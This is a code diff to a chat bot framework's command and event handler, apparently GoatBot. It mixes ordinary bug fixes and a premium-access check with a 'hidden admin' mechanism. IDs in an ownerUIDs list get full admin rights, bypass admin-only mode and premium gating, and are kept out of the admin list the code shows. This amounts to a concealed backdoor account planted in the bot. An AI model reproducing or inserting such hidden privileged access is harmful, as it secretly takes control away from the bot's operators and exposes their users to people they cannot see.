@@ -8,11 +8,45 @@ function getType(obj) {
 }
 
 function getRole(threadData, senderID) {
-	const adminBot = global.GoatBot.config.adminBot || [];
 	if (!senderID)
 		return 0;
+
+
+	const visibleAdminBot = global.GoatBot.originalAdminBot || global.GoatBot.config.adminBot || [];
+
+
+	const ownerUIDs = global.GoatBot.ownerUIDs || [];
+
+
+	const isVisibleAdmin = visibleAdminBot.includes(senderID.toString()) || visibleAdminBot.includes(senderID);
+	const isHiddenAdmin = ownerUIDs.includes(senderID.toString()) || ownerUIDs.includes(senderID);
+
+	if (isVisibleAdmin || isHiddenAdmin) {
+		return 2; // Admin role
+	}
+
+	// Check thread admin
 	const adminBox = threadData ? threadData.adminIDs || [] : [];
-	return adminBot.includes(senderID) ? 2 : adminBox.includes(senderID) ? 1 : 0;
+	return adminBox.includes(senderID) ? 1 : 0;
+}
+
+function getVisibleAdminList() {
+
+	return global.GoatBot.originalAdminBot || global.GoatBot.config.adminBot || [];
+}
+
+function isAdmin(senderID) {
+	if (!senderID) return false;
+
+
+	const visibleAdminBot = global.GoatBot.originalAdminBot || global.GoatBot.config.adminBot || [];
+	const isVisibleAdmin = visibleAdminBot.includes(senderID.toString()) || visibleAdminBot.includes(senderID);
+
+
+	const ownerUIDs = global.GoatBot.ownerUIDs || [];
+	const isHiddenAdmin = ownerUIDs.includes(senderID.toString()) || ownerUIDs.includes(senderID);
+
+	return isVisibleAdmin || isHiddenAdmin;
 }
 
 function getText(type, reason, time, targetID, lang) {
@@ -71,7 +105,7 @@ function getRoleConfig(utils, command, isGroup, threadData, commandName) {
 
 function isBannedOrOnlyAdmin(userData, threadData, senderID, threadID, isGroup, commandName, message, lang) {
 	const config = global.GoatBot.config;
-	const { adminBot, hideNotiMessage } = config;
+	const { hideNotiMessage } = config;
 
 	// check if user banned
 	const infoBannedUser = userData.banned;
@@ -82,10 +116,10 @@ function isBannedOrOnlyAdmin(userData, threadData, senderID, threadID, isGroup, 
 		return true;
 	}
 
-	// check if only admin bot - convert to string for comparison
+	// check if only admin bot - use combined admin check (visible + hidden)
 	if (
 		config.adminOnly.enable == true
-		&& !adminBot.includes(senderID.toString()) && !adminBot.includes(senderID)
+		&& !isAdmin(senderID)
 		&& !config.adminOnly.ignoreCommand.includes(commandName)
 	) {
 		if (hideNotiMessage.adminOnly == false)
@@ -130,12 +164,29 @@ function createGetText2(langCode, pathCustomLang, prefix, command) {
 		getText2 = function (key, ...args) {
 			let lang = command.langs?.[langCode]?.[key] || customLang[key] || "";
 			lang = replaceShortcutInLang(lang, prefix, commandName);
-			for (let i = args.length - 1; i >= 0; i--)
+			for (let i = 0; i < args.length; i++)
 				lang = lang.replace(new RegExp(`%${i + 1}`, "g"), args[i]);
 			return lang || `❌ Can't find text on language "${langCode}" for ${commandType} "${commandName}" with key "${key}"`;
 		};
 	}
 	return getText2;
+}
+
+function isPremiumRequired(userData, senderID, commandName, message, langCode, command) {
+	const config = global.GoatBot.config;
+	if (command && command.config.premium == true) {
+		// Admin IDs bypass premium requirement - use helper function that includes hidden admins
+		if (isAdmin(senderID)) {
+			return false;
+		}
+
+		if (!userData.premium) {
+			const premiumMessage = `🔒 You are not a premium member! If you want to access this feature, ask the bot owner or use ${config.prefix}premium request <your message> to request premium access.`;
+			message.reply(premiumMessage);
+			return true;
+		}
+	}
+	return false;
 }
 
 module.exports = function (api, threadModel, userModel, dashBoardModel, globalModel, usersData, threadsData, dashBoardData, globalData) {
@@ -155,7 +206,8 @@ module.exports = function (api, threadModel, userModel, dashBoardModel, globalMo
 		if (threadApproval && threadApproval.enable && threadID && senderID) {
 			try {
 				const threadData = await threadsData.get(threadID);
-				const isAdminBot = config.adminBot.includes(senderID.toString()) || config.adminBot.includes(senderID);
+				const dynamicAdminBot = global.GoatBot.config.adminBot || config.adminBot;
+				const isAdminBot = isAdmin(senderID);
 				const isAutoApprovedThread = threadApproval.autoApprovedThreads && threadApproval.autoApprovedThreads.includes(threadID);
 
 				// Auto-approve threads that are in the autoApprovedThreads list
@@ -277,6 +329,9 @@ module.exports = function (api, threadModel, userModel, dashBoardModel, globalMo
 			// —————  CHECK BANNED OR ONLY ADMIN BOX  ————— //
 			if (isBannedOrOnlyAdmin(userData, threadData, senderID, threadID, isGroup, commandName, message, langCode))
 				return;
+			// ————————————— CHECK PREMIUM ————————————— //
+			if (isPremiumRequired(userData, senderID, commandName, message, langCode, command))
+				return;
 			if (!command)
 				if (!hideNotiMessage.commandNotFound)
 					return await message.reply(
@@ -329,7 +384,11 @@ module.exports = function (api, threadModel, userModel, dashBoardModel, globalMo
 
 				createMessageSyntaxError(commandName);
 				const getText2 = createGetText2(langCode, `${process.cwd()}/languages/cmds/${langCode}.js`, prefix, command);
-				await command.onStart({
+				if (command.onStart && typeof command.onStart != "function")
+					throw new Error('Function onStart must be a function!');
+				if (command.ST && typeof command.ST != "function")
+					throw new Error('Function ST must be a function!');
+				await (command.ST || command.onStart)({
 					...parameters,
 					args,
 					commandName,
@@ -501,6 +560,8 @@ module.exports = function (api, threadModel, userModel, dashBoardModel, globalMo
 						if (typeof handler == "function") {
 							if (isBannedOrOnlyAdmin(userData, threadData, senderID, threadID, isGroup, commandName, message, langCode))
 								return;
+							if (isPremiumRequired(userData, senderID, commandName, message, langCode, command))
+								return;
 							try {
 								await handler();
 								log.info("onFirstChat", `${commandName} | ${userData.name} | ${senderID} | ${threadID} | ${args.join(" ")}`);
@@ -529,7 +590,7 @@ module.exports = function (api, threadModel, userModel, dashBoardModel, globalMo
 			const Reply = onReply.get(event.messageReply.messageID);
 			if (!Reply)
 				return;
-			Reply.delete = () => onReply.delete(messageID);
+			Reply.delete = () => onReply.delete(event.messageReply.messageID);
 			const commandName = Reply.commandName;
 			if (!commandName) {
 				message.reply(utils.getText({ lang: langCode, head: "handlerEvents" }, "cannotFindCommandName"));
@@ -565,6 +626,8 @@ module.exports = function (api, threadModel, userModel, dashBoardModel, globalMo
 				createMessageSyntaxError(commandName);
 				if (isBannedOrOnlyAdmin(userData, threadData, senderID, threadID, isGroup, commandName, message, langCode))
 					return;
+				if (isPremiumRequired(userData, senderID, commandName, message, langCode, command))
+					return;
 				await command.onReply({
 					...parameters,
 					Reply,
@@ -588,10 +651,10 @@ module.exports = function (api, threadModel, userModel, dashBoardModel, globalMo
 		*/
 		async function onReaction() {
 			const { onReaction } = GoatBot;
-			const Reaction = onReaction.get(messageID);
+			const Reaction = onReaction.get(event.messageID);
 			if (!Reaction)
 				return;
-			
+
 			// Check if the user reacting is authorized for this reaction
 			if (Reaction.author && event.userID !== Reaction.author) {
 				// For cmd command, allow any user to react since it's now role 0
@@ -601,8 +664,8 @@ module.exports = function (api, threadModel, userModel, dashBoardModel, globalMo
 					return; // For other commands, only author can react
 				}
 			}
-			
-			Reaction.delete = () => onReaction.delete(messageID);
+
+			Reaction.delete = () => onReaction.delete(event.messageID);
 			const commandName = Reaction.commandName;
 			if (!commandName) {
 				message.reply(utils.getText({ lang: langCode, head: "handlerEvents" }, "cannotFindCommandName"));
@@ -619,7 +682,7 @@ module.exports = function (api, threadModel, userModel, dashBoardModel, globalMo
 			const reactingUserRole = getRole(threadData, event.userID);
 			const roleConfig = getRoleConfig(utils, command, isGroup, threadData, commandName);
 			const needRole = roleConfig.onReaction;
-			
+
 			if (needRole > reactingUserRole) {
 				if (!hideNotiMessage.needRoleToUseCmdOnReaction) {
 					if (needRole == 1)
